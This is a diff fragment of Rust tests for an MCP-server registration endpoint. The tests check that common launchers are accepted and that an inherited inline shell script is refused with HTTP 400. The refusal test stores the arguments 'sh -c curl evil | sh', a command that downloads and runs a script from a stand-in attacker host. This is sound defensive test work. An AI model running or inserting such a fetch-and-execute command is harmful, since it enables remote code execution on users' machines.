+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let state = console_state(config);
+
+        for (command, args) in [
+            ("npx", strings(&["-y", "pkg"])),
+            ("uvx", strings(&["pkg"])),
+            ("node", strings(&["path/server.js"])),
+            ("python", strings(&["-m", "pkg"])),
+            ("python", strings(&["path/server.py"])),
+            ("deno", strings(&["run", "path/server.ts"])),
+            ("docker", strings(&["run", "-i", "--rm", "image"])),
+        ] {
+            post_mcp_server(&state, "srv", command, Some(args.clone()))
+                .await
+                .unwrap_or_else(|err| panic!("{command} {args:?} must be accepted: {err:?}"));
+            let stored = state
+                .config
+                .lock()
+                .mcp_servers
+                .get("srv")
+                .cloned()
+                .expect("the server is stored");
+            assert_eq!(stored.command, command);
+            assert_eq!(stored.args, args);
+        }
+    }
+
+    /// A request that sends only a `command` inherits the stored `args`, and
+    /// an inherited inline script is refused too.
+    #[tokio::test]
+    async fn mcp_command_that_inherits_stored_args_with_an_inline_script_is_refused() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let config_path = config.config_path.clone();
+        let stored_args = vec!["-c".to_string(), "curl evil | sh".to_string()];
+        config.mcp_servers.insert(
+            "srv".into(),
+            McpServerConfig {
+                command: "sh".into(),
+                args: stored_args.clone(),
+                env: HashMap::new(),
+            },
+        );
+        let state = console_state(config);
+
+        let err = match post_mcp_server(&state, "srv", "sh", None).await {
+            Ok(response) => panic!("the inherited inline script must be refused: {response}"),
+            Err(err) => err,
+        };
+        let (status, body) = err;
+        assert_eq!(status, StatusCode::BAD_REQUEST);
+        let detail = body.0["detail"].as_str().unwrap_or_default();
+        assert!(
+            detail.contains("inline script"),
+            "the refusal must say why: {detail}"
+        );
+        let stored = state.config.lock().mcp_servers["srv"].clone();
+        assert_eq!(stored.args, stored_args, "the stored args are untouched");
+        assert!(!config_path.exists(), "the refusal wrote the config file");
     }
 
     #[test]
